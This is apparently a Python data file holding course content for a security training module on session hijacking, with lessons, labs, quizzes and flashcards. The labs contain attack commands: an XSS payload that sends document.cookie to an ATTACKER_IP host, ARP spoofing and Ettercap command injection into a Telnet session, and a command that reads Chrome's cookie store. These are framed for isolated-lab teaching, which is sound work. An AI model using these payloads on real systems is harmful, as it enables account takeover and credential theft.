import os
import json

content = {
    'session-hijacking-concepts': {
        'eyebrow': 'Module 11 · Topic 1',
        'title': 'Session Hijacking Concepts',
        'module': 'Phase 11: Application Security Analyst',
        'sub': 'Understanding the fundamentals of session hijacking and its impact.',
        'objectives': [
            'Define session hijacking and its underlying mechanisms.',
            'Differentiate between active and passive session hijacking.',
            'Understand the typical session hijacking process.'
        ],
        'learn': {
            'simple': 'Session hijacking, sometimes known as cookie hijacking, is the exploitation of a valid computer session to gain unauthorized access to information or services in a computer system. In particular, it refers to the theft of a magic cookie used to authenticate a user to a remote server.',
            'analogy': 'It is like someone stealing your VIP wristband at a concert; they can now access all the restricted areas pretending to be you, without needing to show your ID.',
            'architecture': 'The attack typically begins with the attacker monitoring network traffic or exploiting a vulnerability to intercept or predict a session token. Once the attacker possesses a valid session ID, they can inject it into their own HTTP requests. The server, trusting the session ID, grants the attacker the same privileges as the legitimate user. This bypasses the authentication phase entirely.',
            'why': 'Session hijacking is critical because it allows attackers to bypass authentication controls, leading to account takeover, data breaches, and unauthorized transactions, all while appearing as a legitimate user.'
        },
        'enterprise': {
            'gfs': 'At Global Financial Services, an attacker hijacking a trader\'s session could execute unauthorized multi-million dollar trades or access sensitive market strategies.',
            'windows': 'In Windows environments, session hijacking can target SMB sessions or RDP connections, potentially leading to lateral movement across the enterprise network.',
            'linux': 'In Linux servers, hijacked SSH or administrative web panel sessions can provide root-level access or control over critical infrastructure components.'
        },
        'workflow': [
            'Step 1: The legitimate user authenticates to the server.',
            'Step 2: The server issues a session token to the user.',
            'Step 3: The attacker intercepts or predicts the session token.',
            'Step 4: The attacker injects the stolen token into their own browser.',
            'Step 5: The attacker accesses the application masquerading as the user.',
            'Step 6: The attacker performs unauthorized actions.'
        ],
        'diagram': {
            'caption': 'Click to interact with the diagram',
            'svg': '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="50" y="150" width="100" height="100" fill="#e0e0e0"/><text x="100" y="200" dominant-baseline="middle" text-anchor="middle">User</text><rect x="450" y="150" width="100" height="100" fill="#e0e0e0"/><text x="500" y="200" dominant-baseline="middle" text-anchor="middle">Server</text><path d="M 150 200 L 450 200" stroke="black" stroke-width="2" marker-end="url(#arrow)"/><text x="300" y="190" text-anchor="middle">Session Token</text><rect x="250" y="300" width="100" height="50" fill="#ffcccc"/><text x="300" y="325" dominant-baseline="middle" text-anchor="middle">Attacker</text><path d="M 300 300 L 300 200" stroke="red" stroke-width="2" stroke-dasharray="5,5"/></svg>'
        },
        'commands': {
            'lin': [
                { 'cmd': 'tcpdump -i eth0 -w traffic.pcap', 'purpose': 'Capture network traffic to look for session cookies.', 'out': 'Packets captured to file', 'note': 'Use filters for specific ports', 'mistake': 'Filling up disk space with unstructured captures' }
            ],
            'win': [
                { 'cmd': 'type %userprofile%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies', 'purpose': 'Attempt to read local cookie files', 'out': 'Database file content', 'note': 'Usually encrypted or locked', 'mistake': 'Assuming plain text storage' }
            ]
        },
        'lab': {
            'type': 'guided',
            'difficulty': 'Intermediate',
            'duration': '45',
            'platform': 'Kali Linux',
            'environment': 'Local Lab',
            'tools': ['Wireshark', 'Burp Suite'],
            'dependencies': [],
            'safety': ['Perform this lab only in an isolated environment.'],
            'scenario': 'Simulate an insecure login process to intercept a session cookie.',
            'objectives': ['Capture unencrypted HTTP traffic.', 'Extract the session cookie.', 'Replay the session cookie to gain access.'],
            'steps': [
                'Step 1: Start Wireshark and listen on the local interface.',
                'Step 2: Log in to the vulnerable web application.',
                'Step 3: Filter Wireshark traffic for HTTP POST requests.',
                'Step 4: Locate the Set-Cookie header in the response.',
                'Step 5: Use a browser extension to inject the cookie into a new session.'
            ],
            'evidence': ['Screenshot of the captured cookie in Wireshark.', 'Screenshot of the hijacked session in the browser.'],
            'validation': ['You should see the account details of the hijacked user without logging in.'],
            'troubleshooting': ['If no traffic is captured, check the interface selection in Wireshark.'],
            'mitre': [{ 'id': 'T1539', 'name': 'Steal Web Session Cookie', 'tactic': 'Credential Access' }],
            'cleanup': ['Close Wireshark and log out of the vulnerable application.']
        },
        'quiz': [
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the primary goal of session hijacking?',
                'opts': ['To guess a user\'s password', 'To bypass the authentication process by stealing a valid session token', 'To crash the target server', 'To encrypt user data for ransom'],
                'correct': 1,
                'fb': 'Session hijacking aims to steal a valid session token, allowing the attacker to bypass authentication.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which of the following is NOT a common method of session hijacking?',
                'opts': ['Session Fixation', 'Cross-Site Scripting (XSS)', 'SQL Injection', 'Cross-Site Request Forgery (CSRF)'],
                'correct': 2,
                'fb': 'SQL Injection is primarily used to interact with a database, not directly for hijacking a session, although it could theoretically be used to steal session tokens stored in a database.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Easy',
                'q': 'Session hijacking only occurs over unencrypted HTTP connections.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'While HTTP makes interception easier, session hijacking can occur over HTTPS if endpoints are compromised (e.g., via XSS or malware).'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'In passive session hijacking, what does the attacker do?',
                'opts': ['Injects traffic into the session', 'Takes over the session entirely, disconnecting the legitimate user', 'Monitors and records the session traffic without interfering', 'Floods the server with session requests'],
                'correct': 2,
                'fb': 'Passive hijacking involves monitoring and recording data (like sniffing) without altering the communication flow.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Hard',
                'q': 'What distinguishes active session hijacking from passive?',
                'opts': ['Active hijacking requires physical access', 'Active hijacking involves the attacker taking over the session and often silencing the legitimate user', 'Active hijacking only works on wireless networks', 'Active hijacking is undetectable'],
                'correct': 1,
                'fb': 'Active hijacking involves interacting with the target system, taking control of the session, and often disrupting the legitimate user\'s connection.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which OSI layer does session hijacking primarily target?',
                'opts': ['Layer 3 (Network)', 'Layer 4 (Transport)', 'Layer 5 (Session)', 'Layer 7 (Application)'],
                'correct': 2,
                'fb': 'Session hijacking primarily targets Layer 5 (Session layer), although it often exploits vulnerabilities at Layer 7 (Application) or Layer 4 (Transport, TCP hijacking).'
            },
            {
                'type': 'true-false',
                'difficulty': 'Intermediate',
                'q': 'Using predictable session IDs makes a web application more secure against hijacking.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'Predictable session IDs make it easy for attackers to guess valid tokens, making the application highly vulnerable.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which mitigation technique helps prevent session hijacking over a network?',
                'opts': ['Using Telnet instead of SSH', 'Implementing IPsec or SSL/TLS for all communications', 'Disabling firewalls', 'Using static IP addresses'],
                'correct': 1,
                'fb': 'Encrypting the traffic using SSL/TLS or IPsec prevents attackers from sniffing session tokens off the network.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Hard',
                'q': 'What is "Session sniffing"?',
                'opts': ['Guessing session IDs through brute force', 'Intercepting network traffic to capture session identifiers', 'Forcing a user to authenticate with a known session ID', 'Exploiting XSS to steal cookies'],
                'correct': 1,
                'fb': 'Session sniffing refers specifically to using packet sniffers to intercept network traffic and extract session tokens.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Why do attackers target session IDs instead of passwords?',
                'opts': ['Session IDs are always shorter than passwords', 'Passwords are never sent over the network', 'Session IDs bypass the need for multi-factor authentication (MFA)', 'Session IDs are easier to brute-force'],
                'correct': 2,
                'fb': 'Once a user authenticates (even with MFA), the session ID represents that authenticated state. Stealing it bypasses the need to pass MFA checks.'
            }
        ],
        'flashcards': [
            { 'f': 'Session Hijacking', 'b': 'The exploitation of a valid computer session to gain unauthorized access to information or services.' },
            { 'f': 'Session Token', 'b': 'A unique identifier, usually in the form of a cookie, used to track an authenticated user.' },
            { 'f': 'Active Hijacking', 'b': 'The attacker takes over an existing session, often disconnecting the legitimate user.' },
            { 'f': 'Passive Hijacking', 'b': 'The attacker monitors network traffic to capture session data without interfering.' }
        ],
        'summary': [
            'Session hijacking allows attackers to bypass authentication by stealing a valid session token.',
            'It can be active (taking over) or passive (monitoring).',
            'Predictable session IDs are a major vulnerability.',
            'Encryption (HTTPS) is a critical defense against network-based sniffing.',
            'It often targets web applications and TCP sessions.'
        ],
        'outcomes': [
            'Explain the concept of session hijacking.',
            'Identify the differences between active and passive hijacking.',
            'Describe the typical steps involved in a session hijacking attack.'
        ],
        'meta': {
            'contentVersion': '1.0.0',
            'estimatedTime': 45,
            'difficulty': 'Intermediate',
            'prerequisites': ['Basic networking', 'Web application architecture'],
            'lastReviewed': '2026-07-18'
        }
    },
    'application-level-hijacking': {
        'eyebrow': 'Module 11 · Topic 2',
        'title': 'Application-Level Session Hijacking',
        'module': 'Phase 11: Application Security Analyst',
        'sub': 'Exploring techniques used to hijack sessions at the application layer.',
        'objectives': [
            'Understand application-level session hijacking techniques.',
            'Explain Session Fixation and Cross-Site Scripting (XSS) in the context of hijacking.',
            'Identify methods for preventing application-level hijacking.'
        ],
        'learn': {
            'simple': 'Application-level session hijacking focuses on stealing or manipulating the session tokens (like HTTP cookies) used by web applications to maintain state. Attackers exploit vulnerabilities in the application\'s code or design rather than the underlying network.',
            'analogy': 'It is like someone tricking the bouncer into giving you a VIP wristband with a specific number they already know, so they can use a copy of that wristband to enter later.',
            'architecture': 'Techniques include Session Sniffing (capturing cookies over unencrypted HTTP), Cross-Site Scripting (injecting malicious JavaScript to read document.cookie), and Session Fixation (forcing the user to authenticate using a session ID predetermined by the attacker). These attacks exploit how browsers and web servers handle session state.',
            'why': 'With the vast majority of enterprise services moving to the web, application-level hijacking is one of the most common and critical attack vectors, often leading to immediate account compromise.'
        },
        'enterprise': {
            'gfs': 'At Global Financial Services, an XSS vulnerability in the customer portal could allow attackers to steal session cookies of high-net-worth clients, leading to unauthorized fund transfers.',
            'windows': 'In Windows environments, applications using integrated authentication mechanisms (like NTLM over HTTP) might be targeted if session tokens are mishandled.',
            'linux': 'Linux-hosted web applications (LAMP stack) are frequent targets for XSS and Session Fixation if input validation and session management are poorly implemented.'
        },
        'workflow': [
            'Step 1: Identify a vulnerability (e.g., XSS) in the target application.',
            'Step 2: Craft a malicious payload designed to steal the session cookie.',
            'Step 3: Deliver the payload to the victim (e.g., via a phishing link).',
            'Step 4: The victim\'s browser executes the payload, sending the cookie to the attacker.',
            'Step 5: The attacker injects the stolen cookie into their browser.',
            'Step 6: The attacker accesses the victim\'s account.'
        ],
        'diagram': {
            'caption': 'Click to interact with the diagram',
            'svg': '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="50" y="50" width="120" height="80" fill="#e0e0e0"/><text x="110" y="90" dominant-baseline="middle" text-anchor="middle">Attacker</text><rect x="400" y="50" width="120" height="80" fill="#e0e0e0"/><text x="460" y="90" dominant-baseline="middle" text-anchor="middle">Victim</text><rect x="225" y="250" width="120" height="80" fill="#e0e0e0"/><text x="285" y="290" dominant-baseline="middle" text-anchor="middle">Web Server</text><path d="M 170 90 L 400 90" stroke="red" stroke-width="2" marker-end="url(#arrow)"/><text x="285" y="80" text-anchor="middle" font-size="12">1. Sends malicious link (XSS)</text><path d="M 460 130 L 320 250" stroke="black" stroke-width="2" marker-end="url(#arrow)"/><text x="400" y="200" text-anchor="middle" font-size="12">2. Clicks link, logs in</text><path d="M 460 90 Q 285 -20 110 50" stroke="red" stroke-width="2" stroke-dasharray="5,5" marker-end="url(#arrow)" fill="none"/><text x="285" y="10" text-anchor="middle" font-size="12">3. Payload sends cookie to attacker</text></svg>'
        },
        'commands': {
            'lin': [
                { 'cmd': 'curl -I http://example.com | grep Set-Cookie', 'purpose': 'Inspect how session cookies are set.', 'out': 'Cookie attributes (HttpOnly, Secure)', 'note': 'Check for missing security flags', 'mistake': 'Ignoring the Secure flag on HTTPS sites' }
            ],
            'win': [
                { 'cmd': 'Invoke-WebRequest -Uri http://example.com -SessionVariable session; $session.Cookies.GetCookies("http://example.com")', 'purpose': 'Extract cookies using PowerShell', 'out': 'Cookie details', 'note': 'Useful for scripting API interactions', 'mistake': 'Not handling redirects properly' }
            ]
        },
        'lab': {
            'type': 'guided',
            'difficulty': 'Intermediate',
            'duration': '45',
            'platform': 'Kali Linux',
            'environment': 'Local Lab',
            'tools': ['Burp Suite', 'Firefox'],
            'dependencies': [],
            'safety': ['Perform this lab only in an isolated environment.'],
            'scenario': 'Exploit a reflected XSS vulnerability to steal a session cookie.',
            'objectives': ['Identify an XSS vulnerability.', 'Craft a payload to steal the cookie.', 'Hijack the session using the stolen cookie.'],
            'steps': [
                'Step 1: Navigate to the vulnerable search page.',
                'Step 2: Inject a test payload: `<script>alert(1)</script>`.',
                'Step 3: Host a simple listener on your attacker machine (`python3 -m http.server 80`).',
                'Step 4: Inject the payload: `<script>fetch("http://ATTACKER_IP/?cookie=" + document.cookie)</script>`.',
                'Step 5: View the captured cookie in the Python server logs.',
                'Step 6: Use Burp Suite to replace your session cookie with the stolen one.'
            ],
            'evidence': ['Screenshot of the Python server log showing the cookie.', 'Screenshot of the hijacked account.'],
            'validation': ['You should successfully access the victim account without credentials.'],
            'troubleshooting': ['If the cookie is not sent, ensure the application is not using the HttpOnly flag.'],
            'mitre': [{ 'id': 'T1185', 'name': 'Browser Session Hijacking', 'tactic': 'Collection' }],
            'cleanup': ['Close the Python server and clear browser cookies.']
        },
        'quiz': [
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which attack involves forcing a user to authenticate with a predetermined session ID?',
                'opts': ['Session Sniffing', 'Cross-Site Scripting (XSS)', 'Session Fixation', 'Cross-Site Request Forgery (CSRF)'],
                'correct': 2,
                'fb': 'In Session Fixation, the attacker provides a valid session ID to the victim, waits for them to log in, and then uses that same ID to access the account.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which cookie attribute prevents client-side scripts (like JavaScript) from accessing the cookie?',
                'opts': ['Secure', 'HttpOnly', 'SameSite', 'Path'],
                'correct': 1,
                'fb': 'The HttpOnly flag instructs the browser not to allow client-side scripts to access the cookie, mitigating XSS-based cookie theft.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What does the "Secure" flag on a cookie enforce?',
                'opts': ['The cookie can only be transmitted over encrypted (HTTPS) connections.', 'The cookie is encrypted at rest.', 'The cookie cannot be read by JavaScript.', 'The cookie never expires.'],
                'correct': 0,
                'fb': 'The Secure flag ensures the browser only sends the cookie over HTTPS, preventing session sniffing over unencrypted networks.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Hard',
                'q': 'How does Cross-Site Scripting (XSS) facilitate session hijacking?',
                'opts': ['By crashing the web server', 'By injecting malicious scripts that read document.cookie and send it to the attacker', 'By brute-forcing the session ID', 'By redirecting DNS requests'],
                'correct': 1,
                'fb': 'XSS allows attackers to execute JavaScript in the victim\'s browser, which can read the session cookie (if HttpOnly is not set) and exfiltrate it.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Easy',
                'q': 'Session fixation requires the attacker to predict the next session ID.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'False. In session fixation, the attacker does not need to predict the ID; they *set* the ID for the victim before authentication.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which of the following is the best defense against Session Fixation?',
                'opts': ['Setting the HttpOnly flag', 'Regenerating the session ID upon successful login', 'Using long session timeouts', 'Encrypting the database'],
                'correct': 1,
                'fb': 'Regenerating the session ID when the user logs in ensures that any pre-existing session ID (potentially fixed by an attacker) becomes invalid.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is a "predictable session token"?',
                'opts': ['A token generated using a strong cryptographic RNG', 'A token that follows a recognizable pattern, such as sequential numbers or encoded timestamps', 'A token stored in an encrypted database', 'A token that changes on every request'],
                'correct': 1,
                'fb': 'Predictable tokens use weak generation algorithms (like MD5 of the username or sequential numbers), allowing attackers to guess valid tokens.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Hard',
                'q': 'In the context of session hijacking, what does CRIME/BEAST attack target?',
                'opts': ['SQL Databases', 'SSL/TLS encryption to recover session cookies', 'DNS Servers', 'ARP Tables'],
                'correct': 1,
                'fb': 'Attacks like CRIME and BEAST exploit vulnerabilities in SSL/TLS implementations to decrypt encrypted traffic and recover session cookies.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Intermediate',
                'q': 'The SameSite cookie attribute helps protect against Cross-Site Request Forgery (CSRF), which is related to session manipulation.',
                'opts': ['True', 'False'],
                'correct': 0,
                'fb': 'True. SameSite prevents the browser from sending cookies along with cross-site requests, mitigating CSRF.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'If an attacker steals a session cookie that does NOT have the Secure flag, how might they have obtained it?',
                'opts': ['By exploiting an XSS vulnerability', 'By sniffing unencrypted HTTP traffic on a public Wi-Fi network', 'By guessing the token', 'Both A and B are possible'],
                'correct': 3,
                'fb': 'Without the Secure flag, the cookie could be sniffed over HTTP. Even without HttpOnly, it could be stolen via XSS. Both are viable vectors.'
            }
        ],
        'flashcards': [
            { 'f': 'Session Fixation', 'b': 'An attack where the adversary forces a user to authenticate using a known session ID.' },
            { 'f': 'HttpOnly Flag', 'b': 'A cookie attribute that prevents client-side scripts from accessing the cookie.' },
            { 'f': 'Secure Flag', 'b': 'A cookie attribute ensuring the cookie is only sent over encrypted (HTTPS) connections.' },
            { 'f': 'Cross-Site Scripting (XSS)', 'b': 'An attack that injects malicious scripts into trusted websites, often used to steal cookies.' }
        ],
        'summary': [
            'Application-level hijacking targets flaws in session management and web application logic.',
            'XSS is a primary method for stealing session cookies if HttpOnly is not used.',
            'Session Fixation tricks users into logging in with an attacker-controlled session ID.',
            'Mitigations include regenerating session IDs upon login and using Secure/HttpOnly flags.',
            'Predictable session IDs allow attackers to guess valid sessions without interaction.'
        ],
        'outcomes': [
            'Identify vulnerabilities that lead to application-level session hijacking.',
            'Explain how XSS and Session Fixation are executed.',
            'Apply mitigation strategies like secure cookie attributes and session regeneration.'
        ],
        'meta': {
            'contentVersion': '1.0.0',
            'estimatedTime': 50,
            'difficulty': 'Advanced',
            'prerequisites': ['Web Application Security', 'HTTP Protocol'],
            'lastReviewed': '2026-07-18'
        }
    },
    'network-level-hijacking': {
        'eyebrow': 'Module 11 · Topic 3',
        'title': 'Network-Level Session Hijacking',
        'module': 'Phase 11: Application Security Analyst',
        'sub': 'Analyzing attacks that target the transport and network layers to hijack sessions.',
        'objectives': [
            'Understand network-level session hijacking concepts (e.g., TCP/IP hijacking).',
            'Explain how sequence number prediction works.',
            'Identify methods for intercepting network traffic (ARP spoofing, DNS spoofing).'
        ],
        'learn': {
            'simple': 'Network-level session hijacking involves intercepting and taking over a connection at the transport (TCP/UDP) or network (IP) layer. Instead of stealing a web cookie, the attacker takes over an established TCP connection, injecting packets that appear to come from the legitimate user.',
            'analogy': 'Imagine two people talking on walkie-talkies. An attacker figures out the radio frequency and the specific code words they are using, then starts transmitting messages pretending to be one of them, taking over the conversation.',
            'architecture': 'TCP session hijacking relies on spoofing IP addresses and predicting TCP sequence numbers. In an established TCP connection, both sides use sequence numbers to keep track of packets. If an attacker can guess or sniff the current sequence number, they can inject malicious packets with the correct sequence number, causing the server to process their commands as if they came from the authenticated client.',
            'why': 'Network-level hijacking can allow attackers to execute arbitrary commands on a server (e.g., via hijacked Telnet, FTP, or unencrypted administrative sessions) without ever needing valid credentials.'
        },
        'enterprise': {
            'gfs': 'At Global Financial Services, an attacker performing ARP spoofing on the internal network could hijack unencrypted management sessions to legacy network devices or databases.',
            'windows': 'In Windows networks, unencrypted SMB or legacy protocols are vulnerable to interception and hijacking if IPsec is not enforced.',
            'linux': 'Linux administrators using Telnet or unencrypted RSH instead of SSH risk having their root sessions hijacked on local networks.'
        },
        'workflow': [
            'Step 1: The attacker gains access to the same local network as the victim.',
            'Step 2: The attacker uses ARP spoofing to place themselves in a Man-in-the-Middle (MitM) position.',
            'Step 3: The attacker sniffs the traffic between the client and server.',
            'Step 4: The attacker identifies the current TCP sequence and acknowledgment numbers.',
            'Step 5: The attacker injects a spoofed packet with the correct sequence number into the stream.',
            'Step 6: The attacker desynchronizes the legitimate client (optional) to prevent interference.'
        ],
        'diagram': {
            'caption': 'Click to interact with the diagram',
            'svg': '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="50" y="150" width="100" height="80" fill="#e0e0e0"/><text x="100" y="190" dominant-baseline="middle" text-anchor="middle">Client (IP:A)</text><rect x="450" y="150" width="100" height="80" fill="#e0e0e0"/><text x="500" y="190" dominant-baseline="middle" text-anchor="middle">Server (IP:B)</text><rect x="250" y="300" width="100" height="80" fill="#ffcccc"/><text x="300" y="340" dominant-baseline="middle" text-anchor="middle">Attacker</text><path d="M 150 170 L 450 170" stroke="black" stroke-width="2" marker-end="url(#arrow)"/><text x="300" y="160" text-anchor="middle" font-size="12">Established TCP Connection</text><path d="M 280 300 L 450 200" stroke="red" stroke-width="2" marker-end="url(#arrow)"/><text x="400" y="270" text-anchor="middle" fill="red" font-size="12">Spoofed Packet (Src: IP:A)</text><text x="400" y="285" text-anchor="middle" fill="red" font-size="12">Correct Seq Number</text></svg>'
        },
        'commands': {
            'lin': [
                { 'cmd': 'arpspoof -i eth0 -t <victim_ip> <gateway_ip>', 'purpose': 'Perform ARP spoofing to intercept traffic.', 'out': 'ARP replies sent', 'note': 'Requires IP forwarding enabled', 'mistake': 'Causing a Denial of Service by not forwarding packets' }
            ],
            'win': [
                { 'cmd': 'arp -a', 'purpose': 'View the ARP cache to detect spoofing.', 'out': 'IP-to-MAC mappings', 'note': 'Look for duplicate MAC addresses', 'mistake': 'Ignoring dynamic entries' }
            ]
        },
        'lab': {
            'type': 'guided',
            'difficulty': 'Advanced',
            'duration': '60',
            'platform': 'Kali Linux',
            'environment': 'Local Lab',
            'tools': ['Ettercap', 'Netcat'],
            'dependencies': [],
            'safety': ['Perform this lab only in an isolated environment. Do not use on production networks.'],
            'scenario': 'Hijack an unencrypted Telnet session between two machines on the local network.',
            'objectives': ['Set up a Man-in-the-Middle (MitM) position.', 'Monitor the Telnet connection.', 'Inject commands into the active session.'],
            'steps': [
                'Step 1: Enable IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`.',
                'Step 2: Start Ettercap in graphical mode: `ettercap -G`.',
                'Step 3: Scan for hosts and add the Victim and Server as Target 1 and Target 2.',
                'Step 4: Start ARP poisoning.',
                'Step 5: View the connections and select the active Telnet session.',
                'Step 6: Use Ettercap to inject a command (e.g., `touch /tmp/hacked`) into the session.'
            ],
            'evidence': ['Screenshot of Ettercap capturing the connection.', 'Screenshot of the injected command executing on the server.'],
            'validation': ['Verify the file `/tmp/hacked` was created on the server without logging in.'],
            'troubleshooting': ['If the connection drops, ensure IP forwarding is correctly enabled on the attacker machine.'],
            'mitre': [{ 'id': 'T1557', 'name': 'Adversary-in-the-Middle', 'tactic': 'Credential Access' }],
            'cleanup': ['Stop ARP poisoning in Ettercap and disable IP forwarding.']
        },
        'quiz': [
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is a prerequisite for a successful TCP session hijacking attack?',
                'opts': ['Knowing the user\'s password', 'Predicting or knowing the correct TCP sequence number', 'Cracking the SSL/TLS encryption', 'Having physical access to the server'],
                'correct': 1,
                'fb': 'To inject packets that the server will accept as part of an established TCP connection, the attacker must use the correct sequence number.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'How does ARP spoofing facilitate network-level session hijacking?',
                'opts': ['It crashes the target server.', 'It allows the attacker to intercept traffic between the client and server, placing them in a MitM position.', 'It guesses the TCP sequence numbers automatically.', 'It decrypts HTTPS traffic.'],
                'correct': 1,
                'fb': 'ARP spoofing redirects traffic through the attacker\'s machine, allowing them to sniff packets and determine sequence numbers for hijacking.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Hard',
                'q': 'In a TCP session hijacking attack, what happens if the attacker injects a packet, and then the legitimate client sends a packet?',
                'opts': ['Both packets are processed normally.', 'An ACK storm may occur as both sides send acknowledgments with desynchronized sequence numbers.', 'The server crashes immediately.', 'The client automatically disconnects.'],
                'correct': 1,
                'fb': 'Because the injected packet alters the sequence numbers expected by the server, subsequent legitimate packets cause synchronization issues, often leading to an ACK storm.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Intermediate',
                'q': 'TCP sequence number prediction is easier on modern operating systems than on older ones.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'False. Modern OSes use randomized Initial Sequence Numbers (ISNs), making prediction practically impossible without directly sniffing the traffic.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which of the following is a form of network-level hijacking?',
                'opts': ['Blind Hijacking', 'Cross-Site Scripting (XSS)', 'Session Fixation', 'SQL Injection'],
                'correct': 0,
                'fb': 'Blind hijacking is a network-level attack where the attacker can inject data into a TCP session (by guessing sequence numbers) but cannot see the response.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is UDP hijacking?',
                'opts': ['Intercepting UDP packets and replying to the client before the legitimate server does.', 'Taking over a persistent UDP connection state.', 'Decrypting UDP traffic.', 'Spoofing the UDP sequence numbers.'],
                'correct': 0,
                'fb': 'Because UDP is connectionless and lacks sequence numbers, UDP hijacking usually involves spoofing a reply to a client\'s request before the real server responds (e.g., DNS spoofing).'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Hard',
                'q': 'Which protocol is most effective at preventing network-level session hijacking?',
                'opts': ['HTTP', 'Telnet', 'IPsec', 'FTP'],
                'correct': 2,
                'fb': 'IPsec encrypts and authenticates IP packets at the network layer, preventing attackers from reading sequence numbers or injecting spoofed packets.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Why is Telnet highly vulnerable to network-level session hijacking?',
                'opts': ['It uses weak passwords.', 'It transmits data, including credentials and session traffic, in cleartext.', 'It uses UDP instead of TCP.', 'It does not require authentication.'],
                'correct': 1,
                'fb': 'Because Telnet is unencrypted, an attacker in a MitM position can easily read TCP sequence numbers and inject commands.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Easy',
                'q': 'A Man-in-the-Middle (MitM) position is required for all forms of session hijacking.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'False. Application-level hijacking (like XSS or predicting cookies) does not require a MitM position on the network.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the primary difference between sniffing and hijacking?',
                'opts': ['Sniffing requires physical access, hijacking does not.', 'Sniffing is passive monitoring; hijacking is actively taking over the session.', 'Sniffing only works on wireless networks.', 'There is no difference; they are the same.'],
                'correct': 1,
                'fb': 'Sniffing (e.g., with Wireshark) only reads the data passively. Hijacking involves injecting data and taking control of the active session.'
            }
        ],
        'flashcards': [
            { 'f': 'TCP Sequence Number Prediction', 'b': 'Guessing the sequence numbers used in a TCP connection to inject forged packets.' },
            { 'f': 'ARP Spoofing', 'b': 'Sending forged ARP messages to associate the attacker\'s MAC address with a legitimate IP address.' },
            { 'f': 'Blind Hijacking', 'b': 'Injecting commands into a session where the attacker can send data but cannot see the response.' },
            { 'f': 'ACK Storm', 'b': 'A flood of acknowledgment packets caused by desynchronized TCP sequence numbers during a hijack attempt.' }
        ],
        'summary': [
            'Network-level hijacking targets TCP/UDP sessions by injecting spoofed packets.',
            'It relies on knowing or predicting TCP sequence and acknowledgment numbers.',
            'Attackers often use ARP spoofing to achieve a MitM position to sniff these numbers.',
            'Unencrypted protocols like Telnet and FTP are highly vulnerable.',
            'IPsec and strong encryption (SSH, TLS) are primary defenses.'
        ],
        'outcomes': [
            'Describe the mechanics of TCP session hijacking.',
            'Explain the role of sequence numbers and ARP spoofing in network attacks.',
            'Identify effective mitigations against network-level hijacking.'
        ],
        'meta': {
            'contentVersion': '1.0.0',
            'estimatedTime': 60,
            'difficulty': 'Advanced',
            'prerequisites': ['TCP/IP Protocol Suite', 'Network Routing'],
            'lastReviewed': '2026-07-18'
        }
    },
    'session-hijacking-tools': {
        'eyebrow': 'Module 11 · Topic 4',
        'title': 'Session Hijacking Tools & Countermeasures',
        'module': 'Phase 11: Application Security Analyst',
        'sub': 'Identifying tools used for hijacking and implementing robust defensive strategies.',
        'objectives': [
            'Identify common tools used for session hijacking.',
            'Understand how to use defensive tools to detect hijacking attempts.',
            'Implement comprehensive countermeasures against session hijacking.'
        ],
        'learn': {
            'simple': 'Attackers use a variety of automated tools to perform session hijacking, ranging from packet sniffers to automated MitM frameworks. Defending against these attacks requires a multi-layered approach, including secure coding practices, network encryption, and intrusion detection systems.',
            'analogy': 'Just as burglars have lockpicks and crowbars, hackers have tools like Ettercap and Burp Suite. Defense requires not just stronger locks (encryption), but also alarm systems (IDS) and secure building design (secure coding).',
            'architecture': 'Offensive tools like Ettercap and Bettercap automate ARP spoofing and credential harvesting. Wireshark and tcpdump are used for passive sniffing. Defensively, IPSec and TLS provide encryption, while IDS/IPS solutions (like Snort or Suricata) monitor for ARP anomalies and ACK storms. Developers must implement secure session management, utilizing flags like HttpOnly, Secure, and SameSite, and regenerating tokens upon privilege changes.',
            'why': 'Understanding the tools attackers use is crucial for security professionals to replicate attacks (penetration testing) and to design effective, targeted countermeasures in enterprise environments.'
        },
        'enterprise': {
